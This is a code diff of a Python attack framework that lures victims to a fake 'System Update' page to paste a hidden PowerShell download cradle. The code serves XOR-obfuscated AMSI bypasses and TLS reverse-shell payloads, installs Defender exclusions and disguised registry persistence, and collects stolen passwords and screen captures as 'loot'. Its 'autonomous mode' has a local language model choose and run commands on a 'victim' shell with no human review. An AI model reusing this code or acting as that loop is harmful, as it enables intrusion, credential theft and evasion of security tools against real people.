@@ -25,11 +25,14 @@ from rich.prompt import Prompt
 
 console = Console()
 
+
 def clear_screen():
     """Cross-platform screen clear without using os.system."""
     console.clear()
 
-# Check for optional cryptography library (needed for browser password decryption)
+
+# Check for optional cryptography library (needed for browser password
+# decryption)
 CRYPTO_AVAILABLE = False
 try:
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -41,12 +44,13 @@ except ImportError:
 # TLS CERTIFICATE GENERATION
 # ============================================================================
 
+
 def generate_self_signed_cert():
     """Generate ephemeral self-signed certificate for TLS encryption."""
     cert_dir = tempfile.mkdtemp()
     key_file = f"{cert_dir}/server.key"
     cert_file = f"{cert_dir}/server.crt"
-    
+
     # Generate key + cert silently
     subprocess.run([
         "openssl", "req", "-x509", "-newkey", "rsa:2048",
@@ -54,12 +58,13 @@ def generate_self_signed_cert():
         "-days", "1", "-nodes", "-batch",
         "-subj", "/CN=localhost"
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
+
     return cert_file, key_file
 
 # ============================================================================
 # CONFIG
 # ============================================================================
+
 
 class Config:
     def __init__(self):
@@ -68,10 +73,13 @@ class Config:
         self.http_port = 8080
         self.shell_socket = None
         self.shell_connected = False
-        # Handshake secret (regenerated each run for security)
-        self.handshake_secret = "agent-r-" + ''.join(random.choices(string.ascii_letters, k=8))
+        # Handshake secret (prefer environment variable for persistence
+        # stability)
+        self.handshake_secret = os.getenv(
+            "AGENT_R_SECRET", "agent-r-default-secret")
         # Unique session delimiter (randomized to avoid output collision)
-        self.cmd_delimiter = "---" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)) + "---"
+        self.cmd_delimiter = "---" + \
+            ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)) + "---"
         # Command execution timeout (configurable)
         self.cmd_timeout = 60  # Increased from 30s for long-running tasks
         # TLS cert paths (set at runtime)
@@ -82,10 +90,20 @@ class Config:
         self.letsencrypt_cert = None  # Path to fullchain.pem
         self.letsencrypt_key = None   # Path to privkey.pem
         # Randomized persistence names (avoid detection of "WindowsUpdate" IoC)
-        svc_names = ["WinDefend", "WinUpdate", "MsEdge", "OneDrive", "Teams", "Outlook", "Cortana", "AdobeGC"]
-        self.persist_task_name = random.choice(svc_names) + ''.join(random.choices(string.digits, k=3))
-        self.persist_file_name = random.choice(["svc", "upd", "cfg", "sync"]) + ''.join(random.choices(string.ascii_lowercase, k=4)) + ".ps1"
-    
+        svc_names = [
+            "WinDefend",
+            "WinUpdate",
+            "MsEdge",
+            "OneDrive",
+            "Teams",
+            "Outlook",
+            "Cortana",
+            "AdobeGC"]
+        self.persist_task_name = random.choice(
+            svc_names) + ''.join(random.choices(string.digits, k=3))
+        self.persist_file_name = random.choice(
+            ["svc", "upd", "cfg", "sync"]) + ''.join(random.choices(string.ascii_lowercase, k=4)) + ".ps1"
+
     def use_letsencrypt_cert(self, domain, cert_path, key_path):
         """Use a Let's Encrypt certificate for legitimate TLS."""
         if os.path.exists(cert_path) and os.path.exists(key_path):
@@ -96,19 +114,20 @@ class Config:
             self.letsencrypt_key = key_path
             return True
         return False
-    
+
     def get_ip(self):
         # Return custom domain if set (for Let's Encrypt)
         if self.custom_domain:
             return self.custom_domain
         if not self.public_ip:
             try:
-                result = subprocess.run(["curl", "-s", "ifconfig.me"], 
-                                       capture_output=True, text=True, timeout=5)
+                result = subprocess.run(["curl", "-s", "ifconfig.me"],
+                                        capture_output=True, text=True, timeout=5)
                 self.public_ip = result.stdout.strip()
             except Exception:
                 self.public_ip = "127.0.0.1"
         return self.public_ip
+
 
 CFG = Config()
 
@@ -116,8 +135,10 @@ CFG = Config()
 # AI AUTONOMOUS MODE (DeepSeek Coder via Ollama)
 # ============================================================================
 
+
 class AgentState:
     """Tracks what we know about the victim and our objectives."""
+
     def __init__(self):
         self.hostname = None
         self.username = None
@@ -129,7 +150,7 @@ class AgentState:
         self.persistence_installed = False
         self.command_history = []
         self.iteration = 0
-        
+
     def to_dict(self):
         return {
             "hostname": self.hostname,
@@ -142,6 +163,7 @@ class AgentState:
             "persistence": self.persistence_installed,
             "iteration": self.iteration
         }
+
 
 def ask_ai(prompt, max_tokens=500):
     """Query DeepSeek Coder via Ollama for next action."""
@@ -159,6 +181,7 @@ def ask_ai(prompt, max_tokens=500):
         return response.json().get("response", "").strip()
     except Exception as e:
         return f"[AI ERROR: {e}]"
+
 
 def ask_ai_streaming(prompt, max_tokens=500):
     """Query DeepSeek Coder with LIVE streaming output."""
@@ -192,9 +215,10 @@ def ask_ai_streaming(prompt, max_tokens=500):
     except Exception as e:
         return f"[AI ERROR: {e}]"
 
+
 def build_ai_prompt(state, last_output=""):
     """Build the prompt for the AI to decide next action."""
-    
+
     # Build EDR-aware guidance
     edr_guidance = ""
     if state.edr_processes:
@@ -213,7 +237,7 @@ NO EDR DETECTED - can use more aggressive techniques:
 - PowerShell scripts OK
 - Registry modifications OK
 """
-    
+
     return f"""You are an autonomous pentesting AI with shell access to a Windows victim.
 
 CURRENT STATE:
@@ -231,51 +255,58 @@ OBJECTIVES (complete in order):
 RULES:
 - Respond with ONLY ONE PowerShell command
 - No explanations, just the command
-- Use short, efficient commands  
+- Use short, efficient commands
 - If EDR detected, use stealthier techniques
 - If objective done, move to next
 
 COMMAND:"""
 
+
 def autonomous_mode():
     """Run AI-powered autonomous attack loop."""
-    console.print(Panel("[bold cyan]AI AUTONOMOUS MODE[/]\nDeepSeek Coder 6.7B will decide what to do next.\nPress Ctrl+C to stop.", border_style="cyan"))
-    
+    console.print(
+        Panel(
+            "[bold cyan]AI AUTONOMOUS MODE[/]\nDeepSeek Coder 6.7B will decide what to do next.\nPress Ctrl+C to stop.",
+            border_style="cyan"))
+
     state = AgentState()
     max_iterations = 30
-    
+
     try:
         while state.iteration < max_iterations:
             state.iteration += 1
-            
+
             # 1. Get last command output (if any)
             last_output = state.command_history[-1]["output"] if state.command_history else ""
-            
+
             # 2. Ask AI for next command
-            console.print(f"\n[dim]Thinking... (iteration {state.iteration}/{max_iterations})[/]")
+            console.print(
+                f"\n[dim]Thinking... (iteration {state.iteration}/{max_iterations})[/]")
             prompt = build_ai_prompt(state, last_output)
             ai_response = ask_ai(prompt)
-            
+
             # 3. Parse command from response
-            command = ai_response.strip().split("\n")[0]  # Take first line only
+            command = ai_response.strip().split(
+                "\n")[0]  # Take first line only
             if not command or command.startswith("[AI ERROR"):
                 console.print(f"[red]{ai_response}[/]")
                 time.sleep(5)
                 continue
-            
+
             # 4. Display AI's decision
             console.print(f"[bold yellow]AI Command:[/] {command}")
-            
+
             # 5. Execute on victim
             console.print("[dim]Executing...[/]")
             result = SHELL.execute(command)
-            
+
             # 6. Store in history
             state.command_history.append({"cmd": command, "output": result})
-            
+
             # 7. Display result
-            console.print(Panel(result[:500] if result else "[No output]", title="Output", border_style="green"))
-            
+            console.print(Panel(
+                result[:500] if result else "[No output]", title="Output", border_style="green"))
+
             # 8. Update state based on output
             if "hostname" in command.lower() and result:
                 state.hostname = result.strip()
@@ -287,26 +318,43 @@ def autonomous_mode():
                 state.persistence_installed = True
             if "Key Content" in result or "wifi" in command.lower():
                 state.wifi_passwords.append(result)
-            
+
             # 9. Detect EDR processes from output
-            edr_names = ['defender', 'msmpeng', 'crowdstrike', 'csfalcon', 'carbonblack', 
-                        'sentinel', 'cylance', 'sophos', 'mcafee', 'symantec', 'eset', 
-                        'kaspersky', 'avast', 'avg', 'bitdefender', 'malwarebytes']
+            edr_names = [
+                'defender',
+                'msmpeng',
+                'crowdstrike',
+                'csfalcon',
+                'carbonblack',
+                'sentinel',
+                'cylance',
+                'sophos',
+                'mcafee',
+                'symantec',
+                'eset',
+                'kaspersky',
+                'avast',
+                'avg',
+                'bitdefender',
+                'malwarebytes']
             if result:
                 result_lower = result.lower()
                 for edr in edr_names:
-                    if edr in result_lower and edr not in [e.lower() for e in state.edr_processes]:
+                    if edr in result_lower and edr not in [
+                            e.lower() for e in state.edr_processes]:
                         state.edr_processes.append(edr.capitalize())
-                        console.print(f"[red]EDR Detected: {edr.capitalize()}[/]")
-            
+                        console.print(
+                            f"[red]EDR Detected: {edr.capitalize()}[/]")
+
             # 9. Rate limit
             time.sleep(3)
-            
+
     except KeyboardInterrupt:
         console.print("\n[yellow]Autonomous mode stopped by operator.[/]")
-    
+
     console.print(f"\n[bold]Summary:[/] {state.iteration} commands executed")
     input("[Enter to return to menu]")
+
 
 def ai_assistant_mode():
     """Interactive AI assistant - you tell it what to do in natural language."""
@@ -317,17 +365,17 @@ def ai_assistant_mode():
         "Type 'exit' to return to menu.",
         border_style="cyan"
     ))
-    
+
     while True:
         try:
             user_request = input("\n[You] What do you want to do? > ").strip()
-            
+
             if user_request.lower() == 'exit':
                 break
-            
+
             if not user_request:
                 continue
-            
+
             # Build prompt for command generation
             prompt = f"""You are a PowerShell expert helping with Windows system administration.
 The user wants to: {user_request}
@@ -338,47 +386,58 @@ Generate ONLY the PowerShell command to accomplish this task.
 - Make it efficient
 
 POWERSHELL COMMAND:"""
-            
+
             # Show the prompt being sent
             print()
-            console.print(Panel(f"[bold]Your request:[/] {user_request}", title="Understanding Request", border_style="blue"))
+            console.print(
+                Panel(
+                    f"[bold]Your request:[/] {user_request}",
+                    title="Understanding Request",
+                    border_style="blue"))
             print()
-            
+
             # USE STREAMING for live token display
             ai_response = ask_ai_streaming(prompt, max_tokens=300)
             print()
-            
+
             # Parse command - strip markdown code blocks if present
-            lines = [l.strip() for l in ai_response.strip().split("\n") if l.strip()]
-            
+            lines = [l.strip()
+                     for l in ai_response.strip().split("\n") if l.strip()]
+
             # Filter out markdown formatting
             lines = [l for l in lines if not l.startswith("```")]
-            
+
             command = lines[0] if lines else ""
-            
+
             if not command or command.startswith("[AI ERROR"):
-                console.print(f"[red]Could not parse command from AI response[/]")
+                console.print(
+                    f"[red]Could not parse command from AI response[/]")
                 continue
-            
+
             # Show final command and ask for confirmation
             console.print(f"[bold yellow]→ Command:[/] {command}")
             confirm = input("Execute? [Y/n]: ").strip().lower()
-            
+
             if confirm in ['', 'y', 'yes']:
                 console.print("[dim]Executing...[/]")
                 result = SHELL.execute(command)
-                console.print(Panel(result if result else "[No output]", title="Result", border_style="green"))
+                console.print(
+                    Panel(
+                        result if result else "[No output]",
+                        title="Result",
+                        border_style="green"))
             else:
                 console.print("[dim]Skipped[/]")
-                
+
         except KeyboardInterrupt:
             break
-    
+
     console.print("[yellow]Exiting AI Assistant mode.[/]")
 
 # ============================================================================
 # EVASION HELPERS
 # ============================================================================
+
 
 def get_amsi_bypass():
     """Generate advanced AMSI bypass using memory patching (XOR double-encoded)."""
@@ -392,7 +451,7 @@ $f.SetValue($null,$true)
     # XOR encode with random key
     key = random.randint(1, 254)
     encoded = ','.join(str(ord(c) ^ key) for c in bypass_core.strip())
-    
+
     # Decoder stub
     return f'$k={key};$e=@({encoded});$d=-join($e|%{{[char]($_-bxor$k)}});iex $d'
 
@@ -431,19 +490,34 @@ def get_full_bypass():
 def obfuscate_vars(script):
     """Randomize PowerShell variable names to evade static signatures."""
     import re
-    
+
     var_map = {}
-    vars_to_replace = ['$secret', '$hmac', '$hash', '$resp', '$chal', '$ssl', '$cmd', '$ch', '$h', '$p', '$t', '$w', '$r', '$o']
-    
+    vars_to_replace = [
+        '$secret',
+        '$hmac',
+        '$hash',
+        '$resp',
+        '$chal',
+        '$ssl',
+        '$cmd',
+        '$ch',
+        '$h',
+        '$p',
+        '$t',
+        '$w',
+        '$r',
+        '$o']
+
     for var in vars_to_replace:
-        rand_name = '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,7)))
+        rand_name = '$' + \
+            ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
         var_map[var] = rand_name
-    
+
     # Sort by length descending to replace longer vars first
     for var in sorted(var_map.keys(), key=len, reverse=True):
         pattern = re.escape(var) + r'(?=[^a-zA-Z0-9_]|$)'
         script = re.sub(pattern, var_map[var], script)
-    
+
     return script
 
 
@@ -462,6 +536,7 @@ def obfuscate_protocol_strings(script):
         '$cstr=(-join([char]67,[char]72,[char]65,[char]76,[char]76,[char]69,[char]78,[char]71,[char]69,[char]58));if($ch.StartsWith($cstr))'
     )
     return script
+
 
 def get_tls_payload(ip, port, secret):
     """Generate TLS+handshake payload for persistence scripts with AMSI bypass."""
@@ -490,49 +565,52 @@ while($t.Connected){{$w.Write(">");$c=$r.ReadLine();if(!$c){{break}};$o=iex $c 2
 # SHELL MANAGER - Handles the reverse shell connection
 # ============================================================================
 
+
 class ShellManager:
     """Manages the reverse shell connection."""
-    
+
     def __init__(self):
         self.sock = None
         self.conn = None
         self.addr = None
         self.connected = False
         self.ssl_context = None  # TLS context for wrapping client connections
-    
+
     def start_listener(self, port):
         """Start TLS-encrypted listener with graceful port fallback."""
         raw_sock = None
-        
+
         # Generate or use provided TLS certificate
         if not CFG.cert_file or not CFG.key_file:
             console.print("[dim]Generating TLS certificate...[/]")
             CFG.cert_file, CFG.key_file = generate_self_signed_cert()
-        
+
         # Create SSL context with proper error handling
         try:
             self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             self.ssl_context.load_cert_chain(CFG.cert_file, CFG.key_file)
         except ssl.SSLError as e:
             console.print(f"[red]SSL Certificate Error: {e}[/]")
-            console.print(f"[yellow]Check cert paths: {CFG.cert_file}, {CFG.key_file}[/]")
+            console.print(
+                f"[yellow]Check cert paths: {CFG.cert_file}, {CFG.key_file}[/]")
             raise
         except FileNotFoundError as e:
             console.print(f"[red]Certificate file not found: {e}[/]")
             raise
-        
+
         for attempt_port in range(port, port + 10):
             try:
                 raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 raw_sock.bind(('0.0.0.0', attempt_port))
                 raw_sock.listen(1)
-                
+
                 # Store RAW socket (NOT wrapped) - we wrap each accepted client
                 self.sock = raw_sock
-                
+
                 if attempt_port != port:
-                    console.print(f"[yellow]Port {port} busy, using {attempt_port}[/]")
+                    console.print(
+                        f"[yellow]Port {port} busy, using {attempt_port}[/]")
                 CFG.listener_port = attempt_port
                 console.print(f"[green]TLS Listener on port {attempt_port}[/]")
                 return
@@ -542,83 +620,94 @@ class ShellManager:
                     raw_sock = None
                 continue
         raise Exception(f"No available ports in range {port}-{port+9}!")
-        
+
     def wait_for_connection(self, timeout=300):
         """Wait for shell to connect."""
         import hashlib
         import hmac
-        
+
         self.sock.settimeout(timeout)
         start_time = time.time()
-        
+
         while True:
             # Check for overall timeout
             if time.time() - start_time > timeout:
                 return False
-                
+
             try:
                 # Accept raw TCP connection
                 raw_conn, self.addr = self.sock.accept()
-                console.print(f"[dim]Connection attempt from {self.addr[0]}...[/]")
-                
+                console.print(
+                    f"[dim]Connection attempt from {self.addr[0]}...[/]")
+
                 # BLOCK SPECIFIC IP (Example)
                 # if self.addr[0] == "1.2.3.4":
                 #    raw_conn.close()
                 #    continue
-                
-                # Set timeout BEFORE SSL wrap to prevent hang on non-TLS clients
+
+                # Set timeout BEFORE SSL wrap to prevent hang on non-TLS
+                # clients
                 raw_conn.settimeout(10)
-                
+
                 # Wrap in SSL (TLS handshake happens here)
                 try:
-                    self.conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
-                    console.print(f"[dim]TLS handshake OK from {self.addr[0]}[/]")
+                    self.conn = self.ssl_context.wrap_socket(
+                        raw_conn, server_side=True)
+                    console.print(
+                        f"[dim]TLS handshake OK from {self.addr[0]}[/]")
                 except ssl.SSLError as e:
-                    console.print(f"[yellow]SSL handshake failed from {self.addr[0]}: {e}[/]")
+                    console.print(
+                        f"[yellow]SSL handshake failed from {self.addr[0]}: {e}[/]")
                     raw_conn.close()
                     continue
                 except socket.timeout:
-                    console.print(f"[yellow]SSL handshake timeout from {self.addr[0]} (non-TLS client)[/]")
+                    console.print(
+                        f"[yellow]SSL handshake timeout from {self.addr[0]} (non-TLS client)[/]")
                     raw_conn.close()
                     continue
                 except Exception as e:
-                    console.print(f"[red]SSL error from {self.addr[0]}: {e}[/]")
+                    console.print(
+                        f"[red]SSL error from {self.addr[0]}: {e}[/]")
                     raw_conn.close()
                     continue
-                
+
                 # SECURE HANDSHAKE (Challenge-Response)
                 self.conn.settimeout(10)
                 try:
                     # Send challenge
                     challenge = os.urandom(16).hex()
                     self.conn.send(f"CHALLENGE:{challenge}\n".encode())
-                    
+
                     # Wait for response
                     response = self.conn.recv(256).decode().strip()
-                    
+
                     # Compute expected HMAC
                     expected = hmac.new(
                         CFG.handshake_secret.encode(),
                         challenge.encode(),
                         hashlib.sha256
                     ).hexdigest()
-                    
+
                     if response.lower() == expected.lower():
                         self.connected = True
-                        console.print(f"[bold green]AUTHENTICATED SHELL from {self.addr[0]}![/]")
+                        console.print(
+                            f"[bold green]AUTHENTICATED SHELL from {self.addr[0]}![/]")
                         # Read initial prompt
                         try:
-                            initial = self.conn.recv(4096).decode(errors='ignore')
+                            initial = self.conn.recv(
+                                4096).decode(errors='ignore')
                             console.print(f"[dim]{initial.strip()}[/]")
                         except Exception:
                             pass
                         return True
                     else:
-                        console.print(f"[yellow]Rejected {self.addr[0]} (Invalid handshake response)[/]")
+                        console.print(
+                            f"[yellow]Rejected {self.addr[0]} (Invalid handshake response)[/]")
                         self.conn.close()
                         continue
                 except socket.timeout:
-                    console.print(f"[yellow]Ignored {self.addr[0]} (Handshake timeout)[/]")
+                    console.print(
+                        f"[yellow]Ignored {self.addr[0]} (Handshake timeout)[/]")
                     self.conn.close()
                     continue
                 except Exception as e:
@@ -629,7 +718,7 @@ class ShellManager:
                 continue
             except Exception:
                 return False
-    
+
     def check_connection(self):
         """Check if shell is still alive."""
         try:
@@ -638,10 +727,11 @@ class ShellManager:
         except Exception:
             self.connected = False
             return False
-    
+
     def wait_for_new_shell(self, timeout=30):
         """Wait for a new shell connection (e.g., after UAC bypass)."""
-        console.print(f"[cyan]Waiting for new shell connection (up to {timeout}s)...[/]")
+        console.print(
+            f"[cyan]Waiting for new shell connection (up to {timeout}s)...[/]")
         try:
             self.sock.settimeout(timeout)
             new_conn, new_addr = self.sock.accept()
@@ -661,12 +751,12 @@ class ShellManager:
         except socket.timeout:
             console.print("[yellow]No new shell connected.[/]")
             return False
-    
+
     def execute(self, cmd):
         """Execute command and return output."""
         if not self.connected:
             return "Not connected!"
-        
+
         try:
             # Clear any pending output first
             self.conn.setblocking(0)
@@ -676,16 +766,17 @@ class ShellManager:
             except Exception:
                 pass
             self.conn.setblocking(1)
-            
-            # Use unique session delimiter (randomized at startup to avoid output collision)
+
+            # Use unique session delimiter (randomized at startup to avoid
+            # output collision)
             delimiter = CFG.cmd_delimiter
             wrapped_cmd = f"{cmd}; Write-Host '{delimiter}'"
-            
+
             # Send command with delimiter
             self.conn.send((wrapped_cmd + "\n").encode())
             self.conn.settimeout(CFG.cmd_timeout)  # Configurable timeout
             output = ""
-            
+
             # Read output until we see our unique delimiter
             while True:
                 try:
@@ -693,24 +784,25 @@ class ShellManager:
                     if not chunk:
                         break
                     output += chunk
-                    
+
                     # Check for our delimiter - reliable end detection
                     if delimiter in output:
                         break
                 except socket.timeout:
                     break
-            
+
             # Clean up - remove delimiter and everything after it
             if delimiter in output:
                 output = output.split(delimiter)[0]
-            
+
             # Remove prompt lines and clean up
             lines = output.strip().split('\n')
             cleaned = []
             for line in lines:
                 stripped_line = line.strip()
                 # Skip prompt lines
-                if stripped_line.startswith("PS") and stripped_line.endswith(">"):
+                if stripped_line.startswith(
+                        "PS") and stripped_line.endswith(">"):
                     continue
                 if stripped_line == "PS>":
                     continue
@@ -718,7 +810,7 @@ class ShellManager:
                 if cmd.strip() in stripped_line:
                     continue
                 cleaned.append(line)
-            
+
             result = '\n'.join(cleaned).strip()
             return result if result else "[No output captured]"
         except BrokenPipeError:
@@ -727,7 +819,7 @@ class ShellManager:
         except Exception as e:
             self.connected = False
             return f"[Error: {e}]"
-    
+
     def close(self):
         """Close connection."""
         if self.conn:
@@ -742,31 +834,34 @@ class ShellManager:
                 pass
         self.connected = False
 
+
 SHELL = ShellManager()
 
 # ============================================================================
 # HTTP SERVER - Serves the ClickFix page
 # ============================================================================
 
+
 class ClickFixHandler(BaseHTTPRequestHandler):
     """HTTP handler that serves ClickFix page and payload."""
-    
+
     # def log_message(self, format, *args):
     #     pass  # Suppress logs
-    
+
     def do_GET(self):
         ip = CFG.get_ip()
         port = CFG.listener_port
-        cert_thumbprint = self._get_cert_thumbprint() if hasattr(self, '_get_cert_thumbprint') else None
-        
+        cert_thumbprint = self._get_cert_thumbprint() if hasattr(
+            self, '_get_cert_thumbprint') else None
+
         if self.path == '/s':
             # Memory-only payload for IEX download cradle
             # Now includes: AMSI bypass + Certificate pinning + TLS shell
             secret = CFG.handshake_secret
-            
+
             # Get AMSI bypass (XOR encoded)
             amsi_bypass = get_amsi_bypass()
-            
+
             # Build payload with AMSI bypass prepended
             core_payload = f'''{amsi_bypass};while($true){{try{{
 $h='{ip}';$p={CFG.listener_port};$secret='{secret}';
@@ -786,9 +881,11 @@ $w.WriteLine($resp);
 }}
 while($t.Connected){{$w.Write("PS>");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
 }}catch{{}};Start-Sleep -Seconds 5}}'''
-            # Apply evasion - variable obfuscation + protocol string obfuscation
-            final_payload = obfuscate_protocol_strings(obfuscate_vars(core_payload))
-            
+            # Apply evasion - variable obfuscation + protocol string
+            # obfuscation
+            final_payload = obfuscate_protocol_strings(
+                obfuscate_vars(core_payload))
+
             self.send_response(200)
             self.send_header('Content-type', 'text/plain')
             self.end_headers()
@@ -817,17 +914,19 @@ setInterval(()=>{ document.getElementById("v").src="/live.jpg?t="+new Date().get
                 self.end_headers()
                 self.wfile.write(data)
             except Exception:
-                self.send_response(404); self.end_headers()
-            
+                self.send_response(404)
+                self.end_headers()
+
         elif self.path == '/v':
             # Serve the VBS Loader file
             # Updated to use cmd /c shim for better reliability
             vbs = f'''Set W = CreateObject("WScript.Shell")
 p = W.ExpandEnvironmentStrings("%APPDATA%") & "\\winlogon.ps1"
 W.Run "cmd /c powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & p & """", 0, False'''
-            
+
             self.send_response(200)
-            self.send_header('Content-type', 'text/plain') # Force download as text
+            self.send_header('Content-type',
+                             'text/plain')  # Force download as text
             self.end_headers()
             self.wfile.write(vbs.encode())
 
@@ -835,10 +934,10 @@ W.Run "cmd /c powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass 
             # Serve TLS-encrypted reverse shell with HMAC handshake
             # Includes AMSI bypass + variable obfuscation for evasion
             secret = CFG.handshake_secret
-            
+
             # Get AMSI bypass (XOR encoded, regenerated each time)
             amsi_bypass = get_amsi_bypass()
-            
+
             # Core payload with AMSI bypass prepended
             core_payload = f'''{amsi_bypass};while($true){{try{{
 $h='{ip}';$p={CFG.listener_port};$secret='{secret}';
@@ -858,22 +957,21 @@ $w.WriteLine($resp);
 }}
 while($t.Connected){{$w.Write("PS>");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
 }}catch{{}};Start-Sleep -Seconds 6}}'''
-            
+
             # Apply evasion - variable + protocol string obfuscation
-            final_payload = obfuscate_protocol_strings(obfuscate_vars(core_payload))
-            
+            final_payload = obfuscate_protocol_strings(
+                obfuscate_vars(core_payload))
+
             self.send_response(200)
             self.send_header('Content-type', 'text/plain')
             self.end_headers()
             self.wfile.write(final_payload.encode())
-            
 
-            
         else:
             # Serve ClickFix page - Direct PowerShell command
-            
+
             one_liner = f'''powershell -w hidden -ep bypass -c "IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"'''
-            
+
             html = f'''<!DOCTYPE html>
 <html>
 <head><title>System Update</title>
@@ -925,55 +1023,58 @@ function copyCmd() {{
 </script>
 </body>
 </html>'''
-            
+
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
             self.wfile.write(html.encode())
-            
-            console.print(f"[yellow]Page served to {self.client_address[0]}[/]")
+
+            console.print(
+                f"[yellow]Page served to {self.client_address[0]}[/]")
 
     def do_POST(self):
         """Handle data exfiltration uploads (Text & Binary) with size limits."""
         MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB limit to prevent DoS
-        
+
         try:
             if self.path.startswith('/ups'):
                 from urllib.parse import urlparse, parse_qs
                 query = parse_qs(urlparse(self.path).query)
-                
+
                 dtype = query.get('t', ['unknown'])[0]
                 browser = query.get('b', ['unknown'])[0]
                 target_id = query.get('id', ['unknown'])[0]
-                
+
                 # Validate Content-Length to prevent DoS
                 length = int(self.headers.get('Content-Length', 0))
                 if length > MAX_UPLOAD_SIZE:
-                    console.print(f"[red]Upload rejected: {length} bytes exceeds limit[/]")
+                    console.print(
+                        f"[red]Upload rejected: {length} bytes exceeds limit[/]")
                     self.send_response(413)  # Payload Too Large
                     self.end_headers()
                     return
-                
+
                 if length == 0:
                     self.send_response(400)
                     self.end_headers()
                     return
-                
+
                 if dtype == 'live':
                     # Live feed - read into memory (small frames only)
                     data = self.rfile.read(length)
                     with open("live.jpg", "wb") as f:
                         f.write(data)
-                    self.send_response(200); self.end_headers()
+                    self.send_response(200)
+                    self.end_headers()
                     return
 
                 # Normal Loot - stream directly to disk for large files
                 loot_dir = os.path.join(os.path.dirname(__file__), "loot")
                 os.makedirs(loot_dir, exist_ok=True)
-                
+
                 fname = f"{dtype}_{target_id}_{browser}.txt"
                 fpath = os.path.join(loot_dir, fname)
-                
+
                 # Stream to disk in chunks to prevent memory exhaustion
                 with open(fpath, 'wb') as f:
                     remaining = length
@@ -984,14 +1085,18 @@ function copyCmd() {{
                             break
                         f.write(chunk)
                         remaining -= len(chunk)
-                
-                console.print(f"[green]Loot saved: {fname} ({length} bytes)[/]")
-                self.send_response(200); self.end_headers()
+
+                console.print(
+                    f"[green]Loot saved: {fname} ({length} bytes)[/]")
+                self.send_response(200)
+                self.end_headers()
             else:
-                self.send_response(404); self.end_headers()
+                self.send_response(404)
+                self.end_headers()
         except Exception as e:
             console.print(f"[red]Upload error: {e}[/]")
-            self.send_response(500); self.end_headers()
+            self.send_response(500)
+            self.end_headers()
 
     def log_message(self, format, *args):
         # Suppress logs for live feed to prevent spam
@@ -1004,12 +1109,15 @@ function copyCmd() {{
             sys.stderr.write("%s - - [%s] %s\n" %
                              (self.client_address[0],
                               self.log_date_time_string(),
-                              format%args))
+                              format % args))
         except Exception:
             pass  # Ignore logging errors
+
+
 def start_http_server():
     """Start HTTP server in background."""
-    # Use ThreadingHTTPServer to handle multiple requests (user + victim) concurrently
+    # Use ThreadingHTTPServer to handle multiple requests (user + victim)
+    # concurrently
     from http.server import ThreadingHTTPServer
     server = ThreadingHTTPServer(('0.0.0.0', CFG.http_port), ClickFixHandler)
     thread = threading.Thread(target=server.serve_forever, daemon=True)
@@ -1020,6 +1128,7 @@ def start_http_server():
 # POST-EXPLOITATION MENU
 # ============================================================================
 
+
 def show_menu(title, options):
     """Show menu and get choice."""
     table = Table(show_header=False, box=None)
@@ -1027,9 +1136,14 @@ def show_menu(title, options):
     table.add_column("Desc", style="white")
     for opt, desc in options:
         table.add_row(f"[{opt}]", desc)
-    console.print(Panel(table, title=f"[bold cyan]{title}[/]", border_style="cyan"))
+    console.print(
+        Panel(
+            table,
+            title=f"[bold cyan]{title}[/]",
+            border_style="cyan"))
     valid = [str(o[0]) for o in options]
     return Prompt.ask("Choose", choices=valid, default="0")
+
 
 def menu_persistence():
     """Persistence submenu."""
@@ -1045,7 +1159,7 @@ def menu_persistence():
             ("7", "LOLBin: rundll32 Launcher"),
             ("0", "← Back"),
         ])
-        
+
         if choice == "0":
             break
         elif choice == "1":
@@ -1065,7 +1179,8 @@ def menu_persistence():
             fname = CFG.persist_file_name
             task_name = CFG.persist_task_name
             cmd = f'try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {task_name} /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{fname}" /f;echo "Registry ({task_name}) installed!"'
-            console.print("[cyan]Adding exclusion + registry persistence...[/]")
+            console.print(
+                "[cyan]Adding exclusion + registry persistence...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
             input("\n[Enter to continue]")
@@ -1086,8 +1201,10 @@ def menu_persistence():
             startup_path = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
             tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")
             cmd = f'''try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};$s='{tls_payload}';$s|Out-File "{startup_path}\\u.ps1";echo "Done! TLS Exclusion + persistence installed."'''
-            console.print("[cyan]Adding Startup to Defender exclusion + Installing TLS persistence...[/]")
-            console.print("[yellow]Note: Exclusion needs admin, but may work silently[/]")
+            console.print(
+                "[cyan]Adding Startup to Defender exclusion + Installing TLS persistence...[/]")
+            console.print(
+                "[yellow]Note: Exclusion needs admin, but may work silently[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
             input("\n[Enter to continue]")
@@ -1099,34 +1216,40 @@ def menu_persistence():
             secure_path = "$env:LOCALAPPDATA\\Microsoft\\Windows\\Microsoft projects"
             payload_name = "winlogon.ps1"
             tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")
-            
+
